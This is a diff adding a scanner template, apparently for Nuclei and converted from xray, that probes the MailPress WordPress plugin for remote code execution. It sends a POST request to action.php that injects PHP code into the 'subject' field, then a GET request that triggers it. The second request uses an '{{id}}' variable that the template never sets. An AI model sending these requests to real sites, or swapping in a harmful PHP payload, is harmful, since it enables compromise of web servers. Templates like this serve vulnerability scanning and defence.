@@ -1,0 +1,35 @@
+id: poc-yaml-wordpress-plugin-mailpress-action-php-rce
+
+info:
+  name: poc-yaml-wordpress-plugin-mailpress-action-php-rce
+  author: violin
+  severity: critical
+  tags: xray-converted,rce
+  reference:
+    - https://github.com/Medicean/VulApps/tree/master/w/wordpress/2
+
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/mailpress/mp-includes/action.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{rand_int(1000, 9999)}}%2b{{rand_int(1000, 9999)}};?>&html=&plaintext=&mail_format=standard&autosave=1
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
